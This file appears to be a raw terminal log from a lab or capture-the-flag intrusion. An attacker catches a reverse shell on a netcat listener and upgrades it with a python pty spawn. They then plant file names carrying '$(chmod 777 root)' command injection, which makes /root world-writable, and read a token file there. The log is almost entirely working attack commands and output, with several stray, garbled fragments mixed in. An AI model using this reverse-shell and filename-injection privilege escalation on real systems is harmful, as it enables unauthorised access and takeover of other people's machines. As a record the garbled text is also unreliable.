@@ -1,0 +1,57 @@
+aengineer@tl11-192-168-10-1:~$ nc -nvlp 12345
+listening on [any] 12345 ...
+connect to [192.168.10.1] from (UNKNOWN) [192.168.11.5] 13158
+python -c 'import pty; pty.spawn("/bin/sh")'
+$ bash
+bash
+##########################
+PasswordAuthentication no
+##########################
+
+clamav@tl11-192-168-11-5:~$ touch "foo-\$(chmod 777 root)"
+touch "foo-\$(chmod 777 root)"
+clamav@tl11-192-168-11-5:~$ touch "bar-\$(chmod 777 root)"
+touch "bar-\$(chmod 777 root)"
+clamav@tl11-192-168-11-5:~$ echo "123" > foo-*
+echo "123" > foo-*
+bash: foo-*: ambiguous redirect
+clamav@tl11-192-168-11-5:~$ echo "123" > bar-*bash
+echo "123" > bar-*
+clamav@tl11-192-168-11-5:~$ ls -la /
+ls -la /
+total 89
+drwxr-xr-x 22 root root  4096 Apr  1 22:18 .
+drwxr-xr-x 22 root root  4096 Apr  1 22:18 ..cd 
+drwxr-xr-x  2 root root  4096 Jun 30 11:51 bin
+drwxr-xr-x  4 root root  1024 Jun 30 12:00 boot
+drwxr-xr-x 17 root root  3140 Aug 23 15:14 dev
+drwxr-xr-x 85 root root  4096 Jul  5 00:00 etc
+drwxr-xr-x  3 root root  4096 Apr 20 22:07 home
+lrwxrwxrwx  1 root root    31 Apr  1 22:18 initrd.img -> /boot/initrd.img-3.16.0-4-amd64
+lrwxrwxrwx  1 root root    30 Aug 18  2013 initrd.img.old -> /boot/initrd.img-3.2.0-4-amd64
+drwxr-xr-x 17 root root  4096 Apr 20 21:46 lib
+drwxr-xr-x  2 root root  4096 Jun 30 11:49 lib64
+drwx------  2 root root 16384 Aug 18  2013 lost+found
+drwxr-xr-x  3 root root  4096 Aug 18  2013 media
+drwxr-xr-x  2 root root  4096 Apr  1 21:26 mnt
+drwxr-xr-x  5 root root  4096 Jun 24 11:38 opt
+dr-xr-xr-x 92 root root     0 Aug 23 15:14 proc
+drwxrwxrwx  5 root root  4096 Jul 12 16:39 root
+drwxr-xr-x 17 root root   580 Aug 23 15:14 run
+drwxr-xr-x  2 root root 12288 Jun 30 11:53 sbin
+drwxr-xr-x  2 root root  4096 Aug 18  2013 srv
+dr-xr-xr-x 13 root root     0 Aug 23 15:20 sys
+drwxrwxrwt  8 root root  4096 Aug 23 15:33 tmp
+drwxr-xr-x 10 root root  4096 Aug 18  2013 usr
+drwxr-xr-x 12 root root  4096 Apr 20 22:26 var
+lrwxrwxrwx  1 root root    27 Apr  1 22:18 vmlinuz -> boot/vmlinuz-3.16.0-4-amd64
+lrwxrwxrwx  1 root root    26 Aug 18  2013 vmlinuz.old -> boot/vmlinuz-3.2.0-4-amd64
+clamav@tl11-192-168-11-5:~$ cd /root
+cd /root
+clamav@tl11-192-168-11-5:/root$ ls
+ls
+ipt.sh  process_checker_mail.sh  process_checker_ossec.sh  ls -token
+clamav@tl11-192-168-11-5:/root$ cat token
+cat token
+
+
